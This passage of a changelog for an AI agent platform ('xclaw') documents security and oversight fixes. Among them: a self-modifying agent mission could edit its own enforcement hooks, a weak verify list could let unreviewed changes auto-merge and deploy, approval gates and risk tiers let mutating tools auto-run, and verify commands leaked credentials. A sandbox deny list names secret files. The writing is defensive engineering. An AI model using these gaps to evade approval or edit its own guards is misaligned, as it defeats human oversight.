prod actually runs, `pm2 list` exits 0 with byte-identical output, as do `git
status` and `git rev-parse`. The one variable that could have mattered,
`PM2_HOME`, is unset on the live deployer process, so dropping it is
structurally irrelevant here rather than untested-and-lucky.

### `git status` failing was read as uncommitted work

Found while writing the test above, and fixed alongside it. The rollback path
rescues uncommitted work before `git reset --hard`, and decided via
`dirty.output.trim()` — any output at all meant "dirty". Git's own error text is
output. So is the `[xclaw] command timed out after Nms and was killed` note
`runProcess` appends to a killed command. Either one sent a `git stash push` at a
repository whose status was never actually read.

The test fixture demonstrated it accidentally: with `intent.repoDir` unset,
`git -C undefined status --porcelain` exits 128 with a non-empty message, and the
old check called that dirty. The decision is now the exported pure predicate
`shouldStashBeforeReset`, which requires `code === 0` — reachable in a test
without driving a failing deploy, and graded in both directions.

## 3.365.0

### Mission verification ran with the gateway's entire environment

Every agent-driven shell in xclaw is scrubbed before it runs. `xclaw_bash`
builds its environment through `buildToolEnv` (`src/security/env-policy.mjs`)
and then runs under bwrap confined to the worktree. Mission *verification* did
neither: `sh()` handed `spawn` no `env` at all, so the child inherited the
gateway daemon's full `process.env` — every provider key, the gateway token,
anything the operator exported when they started it.

`grep -rn "env:" src/missions/` returned **zero hits**. Nothing under
`src/missions/` had ever imported the env policy.

That matters because a verify command is not a constant. Three writers reach it,
none of which is a trusted operator typing at a prompt:

- **the model**, indirectly and by default — it owns `package.json` inside the
  worktree, `detectVerifyCommands` (`engine.mjs:51`) reads `scripts.test` from
  it, and `engine.mjs:574` runs `npm install` first, which executes lifecycle
  scripts.
- **the operator**, via `cfg.self.verifyCommands`.
- **any caller of `POST /missions`** — `src/gateway/routes/missions.mjs:70`
  validates the array's *shape* and nothing else.

So the least-trusted string in the mission pipeline ran in the most-privileged
environment in the process.

### Fixed

The policy is applied in the primitive, `runProcess` in
`src/missions/run-cmd.mjs`, rather than at each call site:

```js
const { env } = buildToolEnv(cfg || {});
const child = spawn(exe, argv, { cwd, detached: true, env });
```

With no `cfg`, `buildToolEnv({})` yields `strip-secrets` — the safe mode is what
you get by forgetting, not by remembering, and a future caller of `runProcess`
inherits the scrubbing without having to know it exists. `cfg` is threaded from
`runVerification` and `runMissionTournament` into all three `sh()` call sites,
so `security.bashEnv` / `envAllow` / `envDeny` now govern verification the same
way they govern the agent's own shell. Git snapshot plumbing (`snapshotWorktree`)
stays on the default policy — it has no legitimate use for a credential.

Measured before shipping, on a throwaway node project and a scratch git repo,
11 commands × 3 policy modes (33 real subprocess runs): `npm install`,
`npm test`, `npm run lint`, `npm run build`, and the engine's git plumbing
(`add -A`, `diff --cached --quiet`, `commit`, `status`, `worktree list`,
`stash list`, `rev-parse`) all exit identically to the unfiltered baseline in
`strip-secrets`, `allowlist` (the prod profile's mode, `profiles.mjs:85`) and
`inherit`. The mission engine never runs a git remote operation, so
`SSH_AUTH_SOCK` being dropped under `allowlist` is structurally irrelevant.

**Not fixed here, deliberately:** verify commands still run as root, outside
bwrap. Wrapping them in `wrapSpawnWithOsSandbox` changes what `npm install` and
`npm test` can reach and needs its own slice with a live drive.

### Also

The docblock at `run-cmd.mjs:10` claimed the failed kill "throws ESRCH into a
bare catch". It does not. `child.kill()` on a dead pid is a silent no-op — Node
swallows ESRCH and returns `false`, so nothing throws and nothing logs. (What
*does* throw ESRCH is `process.kill(-pid, ...)` when the child has no process
group of its own, which is the proof that the group-kill fix requires
`detached`.) The hang was identical either way; the sentence was wrong.

## 3.364.0

### A verify timeout that could not reach the process holding the pipe

`sh()` in `src/missions/engine.mjs` took a `timeoutMs` (300s by default) and
armed a `setTimeout` that called `child.kill("SIGKILL")`. The kill could not
work. `spawn` without `detached: true` leaves the child in the PARENT's process
group, so the signal reached only the direct `bash` pid — and for any command
that backgrounds work, that pid has already exited. The resulting `ESRCH` went
into a bare `catch {}`. The promise then kept waiting, because it settles on
`'close'`, which fires only after BOTH stdio streams reach EOF, and the
surviving grandchild still holds the write end of that pipe.

Measured against the shipped bodies, extracted verbatim:

| command | timeout | resolved after |
|---|---|---|
| `sleep 5 & echo hi` | 200ms | **5006ms** |
| grandchild that never exits | any | **never** |

This is the verification path. `npm test --silent` is auto-detected for any node
repo with a `test` script (`engine.mjs:79`), and on this repo `npm test` runs
`scripts/test-hermetic.mjs` with `stdio: "inherit"`, so the whole `node --test`
tree writes into `sh()`'s pipe. There is no outer bound to catch it:
`bailIfAborted` is checked at phase boundaries only, and `sh` takes no abort
signal — a wedged verify holds its `running` map entry until the process is
restarted.

`shArgs` carried the same defect, byte-identically.

### Fixed

Both twins are gone from `engine.mjs` and now live in a new primitive,
`src/missions/run-cmd.mjs`, over one shared `runProcess()`:

- **`detached: true` + `process.kill(-child.pid, "SIGKILL")`** — signal the
  GROUP, so the kill reaches the grandchildren that hold the pipe. This is the
  fix `src/computer/modules/bash-tool.mjs:26-42,213-220` already made on the
  other plane, for the same reason.
- **Output is bounded at accumulation, not at resolve.** `out.slice(-20_000)`
  ran once, at the end; a command that printed for an hour held every byte in
  memory first. The final value is unchanged.
- **A killed command now says so.** It used to resolve `{code: 1, output:
  <partial>}` — indistinguishable from a genuine test failure, so the repair
  loop worked against a truncated log with nothing marking the cut. Output now
  carries `[xclaw] command timed out after Nms and was killed`.

The now-dead `import { spawn } from "node:child_process"` was removed from
`engine.mjs`.

Tradeoff, already accepted by `bash-tool`: `detached` removes the child from the
parent's process group, so it no longer dies with a parent Ctrl-C. The timeout
is what stops it now — which is the point.

## 3.363.0

### The mandatory verify floor was a default an operator could delete

`selfVerifyCommands` carried a JSDoc reading "Mandatory verification floor for
self missions" over a body that was `cfg.self?.verifyCommands || [floor]` — a
DEFAULT, not a floor. Every operator value replaced it:

| `self.verifyCommands` | floor present |
|---|---|
| absent | yes |
| `[]` (truthy in JS) | **no** |
| `["true"]` | **no** — verify passes having proven nothing |
| `["npm run mine"]` | **no** |
| `"npm run x"` (string) | **no** — spread into 7 one-character commands |
| `{}` (object) | **no** — spread throws |

This is the same defect the deny list carried until v3.361.0, in the same file,
twenty lines up, with the same `||`. That fix did not reach this line.

It matters because of what sits downstream. `engine.mjs` sets
`mission.autoMerge = cfg.self?.requireMergeApproval === true ? false : true` on
the very next line — so a self mission whose verify list is `["true"]` runs a
command that proves nothing, reports green, force-merges to `main`, and
triggers the pm2 deploy. The floor is the only thing between an autonomous edit
and production.

The object case fails worse than it looks: `mission.profile = "self"` is
assigned BEFORE the throw, and engine.mjs's `catch {}` is silent — so the self
profile stays on while the floor line never executes and `autoMerge` is never
assigned, with nothing logged.

`self.verifyCommands` now ADDS to `SELF_VERIFY_FLOOR`, mirroring `denyPaths`,
and a non-array degrades to the floor instead of spreading or throwing. The
floor is hoisted to a named export so `guard-surface.mjs:135` — which derives
WHICH FILES the floor protects from this same function — re-widens with it,
single-sourced rather than a second list. `docs/SELF_MODIFICATION.md` said
"overrides"; it now says "adds", matching the `denyPaths` paragraph four lines
above it.

Five mutations, every shipping line killed in both directions.

Not fixed, reported: the live host sets no `self.verifyCommands`, so the bad
path was never taken here — but it also sets no `self.requireMergeApproval`,
so every other precondition for the blast radius is live.

## 3.362.0

- The live horizon soak's dollar cap was compared, on every goal of every run,
  against a counter that nothing incremented. `policy.usedUsd` was assigned once
  from the checkpoint and read four times; `usedUsd > maxUsd` was `0 > 2`
  forever. Five goals ran to completion against a ceiling that could not fire,
  and the run filed a report saying `$0.00` — which is what a cap looks like
  when it is working, and also what it looks like when it is absent.

  Pulling that thread found seven more on the same path, each of which alone
  would have kept the cap decorative:

  - **The caps never reached the agent.** `normalizeAgentRequest`
    (`src/agent/run-agent.mjs`) forwards a fixed 16-key allow-list, and neither
    `maxUsd` nor `maxTurns` is on it. Both were dropped in transit. `cfg` IS on
    it, and `cfg` is where `loop.mjs` and `createCostGovernor` actually read
    them, so the soak now routes its per-goal budget through `cfg.agent`.
  - **Three guards that never ran.** `beforeLiveTurn` reached a cost check, a
    receipt check and a canary through property names no target module exports
    (`checkCost`, `requireReceipt`, `checkCanary`; the real exports are
    `createCostGovernor`, `guardHighRiskReceipt`, `runHallucinationCanary`). A
    missing property is `undefined`, not an error, so each one silently skipped
    and the function returned `{ok:true, guards:[]}` — indistinguishable from
    "all three passed". Deleted rather than repaired: every one of them
    duplicates enforcement that already runs a layer down, per turn and per tool
    call, on `loop.mjs:856/1483/2164`.
  - **`Number(null)` is `0`, and `0` is finite.** `turnCostUsd` coerced before
    testing, so `{hasCost:true, costUsd:null}` — the provider saying it priced
    nothing — returned a *measured* $0.00, contradicting the module's own doc
    comment. It now tests the raw value with `Number.isFinite`, matching
    `objective.mjs:83`.
  - **Exhaustion is a bound of zero, not an absent bound.** `budgetForTurn`
    dropped a non-positive remainder from its candidate list, so a soak that had
    spent its budget to the exact penny produced `null` — which the caller
    spreads as no `maxUsd` key at all, and `cost-governor.mjs:31` only blocks
    when `maxUsd > 0`. The one state where the brake matters most released it.
  - **The accumulator was not durable.** `afterLiveTurn` was fed `{...opts}`, so
    each per-goal checkpoint re-wrote the values the run STARTED from. The file
    never zeroed; it simply never advanced, and a soak killed after goal four
    resumed as though it had spent nothing.
  - **The honesty channel was dropped at the last hop.** `buildLiveSoakReport`
    is a fixed object literal with no spread, so `unpricedTurns` never reached
    the durable operator artefact. `usedUsd` without it is a number with no
    error bar.
  - **The CLI then overwrote the truthful report** with the run's *starting*
    turn count and a hardcoded clean canary. That decision lived inside the
    `--live --confirm-live` branch — unreachable by any test without an API key
    and a real provider call — so it is now extracted as `liveReportFromRun`
    and graded directly, the same remedy applied to the cron doctor probes.

  Twenty-eight mutations, every shipping line killed in both directions.

  Report-only, not changed here: `policy.maxTurns` is both the soak's goal-count
  ceiling and the agent's per-run turn cap, which `loop.mjs:244` then multiplies
  by four — 5 goals x 8 x 4 is 160 turns while the cap reads "5 of 8". Clamping
  would break the nightly long-horizon leg. `horizon-cli.mjs` never passes
  `cfg`, so the `Math.min` against an operator budget is exercised only by
  injected-cfg tests, never in production. A budget stop now exits 1, which is
  indistinguishable from goal failure. An injected `runAgent` bypasses
  `loop.mjs` and every guard beneath it.

## 3.361.0

- A self mission could edit the guard that was supposed to stop it, and the
  hardening knob for that guard un-hardened the host. Two defects, one surface.

  `SELF_DENY_PATHS` (`src/self/profile.mjs`) named the *policy* — `src/security/`,
  `src/self/` — but not the machinery that enforces it. `src/hooks/manager.mjs`
  ranks this hook's verdict against every other hook, `src/agent/loop.mjs` is the
  only consumer that acts on a `deny`, and `src/missions/engine.mjs` installs the
  hook in the first place. All three were editable by the mission they police.
  So was the verify floor: `package.json` (the map `npm run` resolves through)
  and `scripts/` (the runners the floor executes). The amplifier is
  `engine.mjs:706`, which force-sets `mission.autoMerge = true` for self missions
  unless `cfg.self.requireMergeApproval === true` — unset on this host — so
  `engine.mjs:1064` merges as soon as verify reports green. A mission that could
  edit the gate could report green.

  Second, `applySelfOverlay` read `cfg.self?.denyPaths || SELF_DENY_PATHS`: pure
  replacement. An operator adding one path to *harden* the host dropped all six
  built-in denies and un-hardened it instead. It is now additive and de-duped.

  The fix does not stop at ten hand-typed entries, because a hand-typed list
  cannot be the guard against hand-typed lists (class 43). New
  `src/self/guard-surface.mjs` derives the surface from the repository itself:
  `enforcementChainFiles` scans `src/` and `bin/` for the identifiers the guard
  needs to work (`SELF_DENY_PATHS`, `isDeniedPath`, `editSurfaceGuard`,
  `registerEditSurfaceHook`, `applySelfOverlay`, `DECISION_RANK`,
  `decision === "deny"`), and `verifyFloorFiles` resolves `selfVerifyCommands`
  through `package.json`'s script map, following `npm run` indirection. The
  suite fails when either derivation names a file the deny list omits, so adding
  a guard module without denying it is now a red test rather than a silent hole.

  Measured at HEAD (e89aadc), the derivation reported the defect directly:

  ```
  enforcement: src/agent/loop.mjs, src/hooks/manager.mjs, src/missions/engine.mjs
  verify:      package.json, scripts/release-gate.mjs
  ```

  A derivation that finds nothing satisfies "uncovered is empty" exactly as well
  as a correct one, so the tests grade behaviour, not emptiness: fixture repos
  pin *where* the scan looks (a marker in `bin/` is found, the 17MB computer
  bundle is skipped, an unmarked module is not flagged) and *what* the floor
  resolves (two-level `npm run` indirection), a data-driven loop re-opens each
  of three real holes and asserts the report names it, and each marker is graded
  against the repo's own files so a rename that silently narrows the scan fails
  the suite. 25/25 mutants caught across both files, restores sha256-identical.

  Not fixed, stated rather than papered over: `test/` cannot be denied (a self
  mission legitimately adds tests), and the floor walks the entry runners, not
  every module they later import.

## 3.360.0

- `POST /queue` refused three fields and never said so. `pickEnqueueRequest`
  withholds `maxAttempts` and `maxWaitMs` from a request body on purpose —
  anyone holding the gateway token could otherwise ask for 99 retries, or a
  `maxWaitMs` of 10**9 that is never abandoned — and drops `priorityClass`
  because it is an internal alias of `class`. That boundary is correct. What was
  wrong is that nothing said so where a caller looks: `docs/QUEUE.md:27`
  advertised `maxAttempts?` in the POST body, and the route answered 202 with a
  job id and no mention that the field had gone. Measured at HEAD (e89aadc), a
  request posting exactly the documented body:

      asked   maxAttempts=5 maxWaitMs=999000
      stored  maxAttempts=1 maxWaitMs=300000   HTTP 202, signal to caller: NONE

  So an operator followed the shipped docs, asked for five attempts, and got a
  job that dead-letters on its first failure with nothing anywhere to explain
  why. The refusal now names itself: `WITHHELD_REQUEST_FIELDS` holds each field
  with its reason, the 202 carries a `withheld: [{field, reason}]` array when —
  and only when — the caller actually sent one, and the docs list the fields the
  route accepts instead of one it does not.
- The knowledge had been living as an absence. Nothing in `queue.mjs` named the
  withheld fields; the reasoning existed only in prose inside two test files, so
  the docs could drift back without contradicting anything. A drift test now
  partitions every `item.<key>` that `enqueueJob` and `resolvePriority` read into
  forwarded or withheld-with-a-reason, with nothing left over, and grades the
  docs' own POST row against that map — the same principle as v3.359.0 grading
  approvals against `ROLE_TOOL_PACKS` rather than another hand-typed list. A
  future field can now be neither silently dropped nor silently promoted to
  caller-settable.
- 6/6 shipping lines mutation-caught, restores sha256-identical; before-state
  proven in a detached HEAD worktree, not with the fix in the tree.

## 3.359.0

- v3.358.0 fixed the approval denylist for the two tools it found and left the
  hole open for a third — the one that was actually reachable. `FORCE_SERIAL`
  was the source of truth that audit graded against, and it is a hand-typed list
  too. It names `xclaw_spawn_subagent`; it has never named `xclaw_spawn_agent`.
  Both are served, and they are the same capability under two names: the loop
  offers `xclaw_spawn_subagent` (`createSpawnTool`, `src/agents/spawn.mjs`), the
  local registry offers `xclaw_spawn_agent` (`createSpawnTools`, wired at
  `src/tools/registry.mjs:14`), and either one hands a slice of work to a child
  agent that then runs tools of its own. They assess to the same risk tier.
  Under prod the first pended and the second auto-ran — and the twin that was
  protected is the one **no shipped tool pack grants**, while the twin that ran
  unasked sits in both the `act` and `browse` packs. The protection landed on
  the unreachable name.
- `xclaw_spawn_agent` is now classified on all three deciding surfaces:
  `TOOL_RISK` in `src/security/policy-matrix.mjs` (which also fixes the
  supervised overlay, derived from that table), the prod `requireApproval` list,
  and the narrower no-profile default. It is deliberately NOT added to
  `FORCE_SERIAL`: that list controls concurrency, not approval, and serialising
  delegation would defeat the parallelism the tool exists to provide.
- The new invariant does not grade against `FORCE_SERIAL`. A hand-typed list
  cannot be the guard against hand-typed lists being incomplete — that is
  exactly how this survived the previous audit. It grades against
  `ROLE_TOOL_PACKS`, the shipped packs: whatever a pack grants IS offered to the
  model, so a pack cannot silently omit a served tool. Every pack-granted name
  must now pend, be in `safeAuto`, or appear in an explicit acknowledged-auto
  list in the test. Adding a tool to a pack without deciding which of the three
  it is now fails the suite instead of shipping.

## 3.358.0

- The approval gate decided by NAME, and its list was a hand-typed subset of the
  tools the host actually serves. Under `approvalPolicy: "risky"` — the default,
  set by both the `prod` profile and the `supervised` autonomy overlay — the
  decision function's last line is `requireApproval.has(name)`. Omission means
  AUTO-RUN. `xclaw_file_edit` and `xclaw_computer_act` are served by the computer
  server, are named in this codebase's own mutator set (`FORCE_SERIAL` in
  `src/agent/tool-concurrency.mjs`), and appeared on no approval list anywhere.
  So on a prod host — `autoApprove: false`, the profile whose whole purpose is
  that mutations get asked about — an agent could rewrite any workspace file and
  drive the desktop mouse and keyboard with no human ever prompted, while the
  identical file change through `xclaw_file_write` pended.
- The decisive comparison: `xclaw_browser_tab` and `xclaw_computer_act` assess to
  the SAME risk tier (`risky`) and are both served live. One pended and one did
  not, decided purely by whether someone had typed the name into a list.
- Measured against `FORCE_SERIAL`, 14 of 20 mutating names auto-ran in prod.
  Of the 20 only 5 are served on any host today, so the real behaviour delta is
  exactly two tools; the other names are added as the existing lists already
  carry unserved aliases — a list whose omissions auto-run should not depend on
  which aliases a future host happens to register.
- This is the same class fixed once before, for one branch only. The comment
  above the failing line records it: *"Before this rule, the 'risky' policy only
  matched the requireApproval list (bash/file_write names), so EVERY MCP tool
  auto-ran unapproved (2026-08-13 audit)."* The MCP branch was patched; the
  locally-served and computer-server branches were left open.
- Fixed on all three surfaces that decide it: `TOOL_RISK` in
  `src/security/policy-matrix.mjs` (which the supervised overlay is derived
  from), the `prod` profile's `requireApproval`, and the no-profile default list
  — the last of which was narrower still, lacking even `browser_tab`.
- A tier-derived or impact-derived general rule was measured and rejected rather
  than assumed: the tier rule would newly pend 12 of 52 tools including
  `web_search`, `browser_screenshot` and `browser_observe` — pure reads that
  v3.351.0 deliberately loosened — and the impact rule 27 of 52. Both lists stay
  hand-typed because they legitimately differ in intent; the new invariant test
  is what keeps them complete, failing if either drifts from `FORCE_SERIAL`.
- Report-only, unfixed: `FORCE_SERIAL` names `xclaw_spawn_subagent` while the
  served local tool is `xclaw_spawn_agent`; and `matrixDecision` in
  `policy-matrix.mjs` answers this same question in the opposite direction
  (fail-CLOSED on an unknown name) with zero production callers and zero tests.

## 3.357.0

- The shipped `act` and `browse` tool packs promised a capability that does not
  exist. Both named `xclaw_file_list` and `list_dir`; neither is in the local
  registry (45 tools) nor among the tools the computer server actually serves
  (7). `compileToolFilter` drops an allowlist entry that matches no tool without
  a word, so every run under those packs — which is every run on a `lab`-profile
  host, where `profiles.mjs` pins `toolPack: "act"` — had no way to list a
  directory at all except by shelling out through `xclaw_bash`. The packs now
  name `glob`, the enumeration tool that is genuinely built.
- The warning for exactly this condition existed and had no reader.
  `missingAllowedTools` computed `["xclaw_file_list","list_dir"]` correctly on
  every single run, and `loop.mjs` emitted it as `onEvent({type:"tools",
  phase:"allow_missing"})`. No operator surface renders that type: not
  `voiceClientEvent`, not any channel, not a log line — the string has never
  appeared in this host's pm2 logs. `AGENT_EVENT_TYPES` does not even list
  `"tools"`, and has no consumers. The remedy for a silent drop was itself
  silent.
- `xclaw doctor` now carries a `tools.allowlist` row: it resolves the run's
  effective allowlist (`agent.allowTools`, else the resolved role pack) against
  the local registry unioned with the computer server's live `/tools`, and names
  every entry that resolves to nothing. Live output before the pack fix, on this
  host: `11 allowed but 2 name no tool on this host: xclaw_file_list, list_dir`.
- The row reports `unverified` rather than a wall of false gaps when the tool
  inventory could not be built. Most pack entries are computer-plane names, so
  grading them against a list that could not contain them would report every one
  as missing — the opposite of the truth.
- The decision is a pure module (`src/cli/doctor-tool-pack.mjs`) because the
  probe's caller loads the real config and cannot be pointed at a fixture, so
  the branches that matter would otherwise ship untested.

## 3.356.0

- `web_fetch`: the advertised `max_chars` bound is now applied to what comes off
  the wire, not only to what is returned. It was applied after `await
  res.text()` — by which point the entire response body was already resident in
  the gateway process. The parameter was real and did truncate the output; it
  bounded the *intake* not at all.
- The sibling call site proves the mechanism was already understood:
  `src/computer/modules/browser-tab-tool.mjs` passes `maxBytes: 2_000_000` to the
  same `safeFetch` helper. `web_fetch` passed none, and `requestPinned`'s
  `maxBytes = 0` default means unbounded — so both omission and an explicit `0`
  fall through to no limit at all.
- The model chooses the URL, so this was a model-reachable memory-exhaustion
  path against the gateway. Measured against the real tool before the fix: a
  `max_chars: 100` request drained **200 MiB** and took RSS from 58 to 683 MiB
  in 305 ms. After: **3.0 MiB** drained, RSS 58 to 60 MiB, 9 ms — with a
  byte-identical 113-character answer, so the bound costs nothing in output.
- `webFetchIntakeCap()` scales the byte budget with the requested character
  budget (markup makes the source larger than the text pulled from it), keeps a
  256 KiB floor so a small `max_chars` still fetches a real page, and is
  self-bounding: it clamps against `MAX_OUTPUT_CHARS` internally rather than
  trusting the caller's clamp.
- Known remaining hole, not closed here: `safeFetch` with `ssrf.mode: "off"`
  returns bare `fetch()`, which ignores `maxBytes` and `timeoutMs` entirely.
  Routing that path through `requestPinned` would change redirect behavior
  (native `fetch` follows redirects; `requestPinned` returns the 3xx), so it is
  reported rather than silently changed. The shipped default is `block`.

## 3.355.0

- Sandbox: `sandbox.denyPatterns` is now enforced. `getSandboxPolicy` has always
  computed it — defaulted to `["**/.git/objects/**"]` — and a fresh literal grep
  across `src/ bin/ test/ docs/` found exactly ONE occurrence: the line that
  creates it. Nothing read it. Its two siblings in the same policy object,
  `allowPaths` and `readOnly`, are both enforced, so the field read as a working
  control while denying nothing. An operator writing
  `denyPatterns: ["**/.env", "**/id_rsa"]` got silent full access to precisely
  the files they enumerated, and the shipped default never protected the git
  object store it names.
- `matchesDenyPattern()` is applied in `guardToolPaths` AFTER resolution, so deny
  beats allow: `allowPaths` widens the boundary, `denyPatterns` cuts holes in
  whatever boundary resulted, and an allowlisted root can never carry a denied
  path through. It applies to reads as well as writes — a deny list exists to
  keep named files out of the agent's hands entirely, not merely to prevent
  corruption. Throwing keeps it inside the existing try/catch, so a denial
  returns `{ok:false, error}` and the loop emits `sandbox_denied` with no
  call-site change.
- The glob subset is the one the shipped default uses: `**` crosses separators,
  `*` and `?` do not, a trailing `/**` also covers the directory itself, regex
  metacharacters are literal, and the match is anchored at both ends. A path
  outside the workspace is judged by its absolute form only — `../allowed/x` is
  not a stable name for a file, it changes the moment the workspace moves. A
  `denyPatterns` written as a bare string reads as one pattern rather than being
  iterated character by character; a wrong-shaped value is ignored, not thrown.
- 24 tests. 17 mutations, every one caught in both directions with
  sha256-identical restores.

## 3.354.0

- Voice: a turn that pends for approval now tells the caller. `voice-ws.mjs`'s
  `onEvent` forwarded only `type === "tool"` start/end, so a voice-originated
  pending reached no surface at all — `produce()` is a per-SSE-stream writer and
  a voice turn has no stream — while `loop.mjs` waited out
  `security.approvalTimeoutMs` (120s default). The caller got two minutes of
  silence on the most latency-sensitive channel there is, then a blocked reply.
- New pure `src/gateway/voice-events.mjs` decides what a voice client is told.
  It also carries every OTHER guard that stops a tool — `sandbox_denied`,
  `egress_denied`, `receipt_required`, `quota_hard_circuit`,
  `plan_revalidate_failed` and `denied` — each of which was silent in the same
  way. Enumerating only the approval phase would have rebuilt the narrowed
  allow-list this release exists to remove.
- Restate suppression reuses `isNewApprovalAsk` rather than growing a fourth
  per-channel dedup; announcing a pending twice on a voice call talks over the
  caller. Tool args stay off the wire (the pendingId is enough). An absent risk
  tier renders as absent, never a fabricated "safe". The announcement never
  tells the caller to say "approve" — `src/voice/commands.mjs` has eight intents
  and none of them approve anything.

## 3.353.0

### Fixed
- **The same risk tier was missing from the other surface an operator approves from.** 3.352.0 put the A2 tier on the Telegram prompt; the webchat approval card had the identical two-layer drop, and a literal grep proved it — `grep -n "risk" ui/webchat/app.js` returned **nothing at all**. The SSE handler hand-narrowed the `approval_required` event to `{pendingId, name, args, timedOut}`, and `addApprovalCard`'s template had no tier slot to render into even if the field had survived. A workspace-escaping `file_write` and a read-only `get_issue` produced the same card.
- The gateway was not the culprit and was ruled out before any fix: `src/gateway/index.mjs` forwards the event verbatim (`produce(e.type || "message", e)`) and `event-types.mjs` is a frozen vocabulary, not a field filter. `riskTier` reached the browser; the UI threw it away.
- The narrowing is now a pure `approvalCardFromEvent` in a new `ui/webchat/risk-tier.mjs`, and the card carries a severity chip (`CRITICAL` / `RISKY` / `SAFE`) in its title row. Both producer shapes normalise in one helper. An unassessed action renders **no chip** rather than a fabricated `SAFE`, and a tier the UI has never seen renders under its own name with a neutral severity instead of being silently mapped onto a known one.
- Only the tier ships, for the reason recorded in 3.352.0: `assessRisk`'s reasons are filesystem-shaped and fabricated for third-party tools, and mixed-accuracy text in a security prompt is worse than absent text.

### Notes
- No shared module is reachable from both surfaces — the browser loads `ui/` statically and cannot import `src/`, and importing `ui/` from server code inverts the dependency direction into the bundle. The tier vocabulary is therefore necessarily duplicated, which is exactly the condition that let the two surfaces disagree in the first place. `test/webchat-approval-risk-tier.test.mjs` pins them against each other (`TIER_LABEL` is now exported for that purpose) and additionally asserts the stylesheet has a rule for every severity the chip can emit — a chip with no CSS is a chip nobody sees, the same defect one layer down.
- The handler runs only inside a live SSE stream in a browser, so the call site is pinned at the source, following `test/risk-readonly-precision.test.mjs`: the pin requires the carrier call and **bans the `name: data.name` literal any revert must reintroduce**. A pure function pinned is not its call site pinned.

## 3.352.0

### Fixed
- **The approval prompt never told the operator how dangerous the action was.** The whole A2 risk system exists to compute a tier: it runs on every authorize, stores the tier on the pending record, returns it from `listPending()`, and emits it on the `approval_required` event as `riskTier`. The TUI renders it and even gates its one-key Allow on `riskTier !== "critical"`. Telegram — the channel the operator actually approves from — rendered nothing. A workspace-escaping `file_write` (critical) and a Linear read (safe) produced **byte-identical prompts apart from the tool name**.
- It was dropped twice over, which is why reading either layer alone made it look present. The handler rebuilt the event as `{id, tool, args}` by hand — narrower than what it was handed, the same capability-dropped-in-transit shape as the queue allow-list in 3.323.0 — and `formatPendingApprovalText` had no slot for a tier even when one arrived.
- The narrowing is now a pure exported `approvalItemFromEvent`, and the prompt leads with the tier: `Risk: 🛑 CRITICAL` / `⚠️ RISKY` / `SAFE`. Both producer shapes normalise in one helper (`listPending()`'s nested `item.risk.tier` and the event's flat `item.riskTier`), so a third caller cannot invent a third shape, and an unassessed action renders no tier rather than claiming one.

### Notes
- Approval fatigue is the mechanism this closes: an operator was asked for 52 inline approvals in 30 minutes during a single audit session (3.125.0). An unlabelled prompt asked at that rate is an Allow-everything prompt — the severity has to be **on** the prompt for the tap to carry information.
- The risk **reasons** are deliberately still not rendered. They are filesystem-shaped and are fabricated for third-party tools that touch no file: `mcp__linear__create_issue` reports `"writes outside workspace (home)"` and `recovery: "git"` for an API call git cannot revert. Mixed-accuracy text in a security prompt is worse than absent text. The tier itself is correct, so only the tier ships; the reasons' falseness is tracked separately.
- The call site sits inside `handleUpdate`'s `onEvent` callback, reachable only by running a real agent loop, so it is pinned at source — both the exact call form and a ban on the hand-built `id: e.pendingId` literal any revert must reintroduce.
- Report-only, found in the same census: the gateway's MCP client and routes ignore `cfg.mcp.enabled`, which is read at exactly one place (`src/agent/mcp-tools.mjs`). Not shipped as a fix — those routes are operator-token-authenticated and the knob appears in no doc and no validator, so there is no proven operator harm.

## 3.351.0

### Fixed
- **The security tiering read third-party tool names as substrings, and tiered 15 reads above 2 mutations.** `assessRisk` picks a tool's impact family with four unanchored regexes over the tool NAME. That is sound for xclaw's own 45 tools, whose names it chose; it is not sound for the 62 tools the MCP servers supply, whose names it does not — and the agent loop wires those in unconditionally, with no `mcp.enabled` gate. `impact: "read"` is the ONLY route to the `safe` tier, so a name that wins READ by accident is auto-approved with no human and no record. On the live surface two real Linear mutations did exactly that: `resolve_diff_thread` matched READ because **"thread" contains "read"**, and `save_status_update` matched READ on `status` while `save` is absent from `WRITE_RE`. Driven through the real approval gate under the live posture (`autoApprove`, `autoApproveMaxTier: "low"`), `save_status_update` returned `approved: true, mode: "auto", awaitingHuman: false` — a write to a live workspace, no human — while the sibling `delete_status_update` correctly pended.
- **The same accident ran the other way, and louder.** Linear names every mutation `save_*` and every reader `get_*`, and `get` appears in no family regex at all — so fifteen pure readers (`get_issue`, `get_document`, `get_workspace`, `get_me`, …) matched nothing, hit the fail-closed `impact = "exec"` default, and tiered `risky`. The classifier was not lenient, it was **inverted**: it pended 15 reads and auto-approved 2 mutations.
- A read certificate for a name xclaw did not choose is now **earned at the leading verb** of the operation (`get|list|read|search|fetch|describe|show|query|find|lookup`), never by a substring sitting anywhere in the name. Anything else keeps the existing fail-closed `exec` default, so an unrecognised third-party verb stays conservative by construction rather than by enumeration. Live surface after the fix: 38 safe / 17 risky / 7 critical, and **every one of the 38 is a genuine reader** — zero mutations remain auto-approvable.

### Notes
- xclaw's own tool names are untouched: the leading-verb rule is gated on the `mcp__` prefix because several of xclaw's readers put the verb LAST (`x_keyword_search`, `mitm_status`) and a uniform rule would have reclassified them. All 45 local tools classify byte-identically before and after (verified by census, drift 0).
- `READ_RE` itself is deliberately **not** anchored. Anchoring would be correct in general, but no local name is currently mis-classified by it, and the `mcp__` rule removes third-party names from that code path entirely — so anchoring would be a behaviour change with regression risk and no defect behind it.
- **This widens auto-approval for 14 third-party read tools** (`risky` → `safe`), which previously pended. They are genuine reads and `safe` is what every other reader in the system gets, but the effect is a real loosening: private Linear/GitHub workspace data now reaches the model without a human gate, the same way `grep` and `file_read` do locally.

## 3.350.0

### Fixed
- Keeps the v3.349.0 concurrency fix from widening local parallelism.

  The verb alternation shipped in v3.349.0 carried three verbs the MCP surface never needed. `view` reclassified two of our own tools — `view_image` and `view_x_video` (which spawns ffmpeg and writes frames) — from serial to parallel-safe. A change whose purpose is to stop uncontrolled names from being certified parallel-safe should not hand that certificate to a local tool that shells out.

  Trimmed to the verbs in use, and pinned by test: all 45 local tools now classify byte-identically to pre-v3.349.0, while the live MCP surface keeps 38 of 62 parallel with zero mutators among them.

  Suite 4564/4564. CI 4/4 (gate 22.22 + 24.15).

## 3.349.0

### Fixed
- `tool-concurrency.mjs` opens by stating its invariant — "Mutating / exec /
browser tools stay serial" — and enforces it with a FORCE_SERIAL denylist over a
fail-closed default. The default is right. `getConcurrencyClass` then re-opened
it:

      if (/_read$|^read_|list_|search|ocr|fetch|info|status|probe/.test(n))

  Two alternatives are anchored (`_read$`, `^read_`); five are bare substrings.
`status` matches anywhere, so `delete_status_update` was certified parallel-safe.
